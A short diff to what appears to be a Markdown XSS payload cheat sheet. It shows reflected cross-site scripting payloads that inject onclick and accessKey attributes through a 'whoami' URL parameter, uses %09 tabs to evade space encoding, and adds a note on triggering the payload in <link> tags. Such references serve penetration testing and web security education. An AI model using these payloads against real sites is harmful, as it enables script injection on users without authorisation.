@@ -223,7 +223,7 @@ If the `whoami` parameter is reflected in the page source, try these payloads:
 ```javascript
 /?whoami=cyborg71'%09onclick='alert(1337)'%09accessKey='x'
 ```
-%09 is used to indicate a horizontal tab. It's useful when application encodes the space character into %20 in the source code. 
+```%09``` is used to indicate a horizontal tab. It's useful when application encodes the space character into %20 in the source code. 
 ```javascript
 /?'accesskey='x'onclick='alert(1337)
 ```
@@ -232,6 +232,9 @@ Now, use this keys to get reflection.
     On Windows: ALT+SHIFT+X
     On MacOS: CTRL+ALT+X
     On Linux: Alt+X
+
+**Note**
+```<link>``` tag doesn't render in the page. So, you must need to provide a```accessKey``` in the payload to execute the payload.  
 
 ---
 
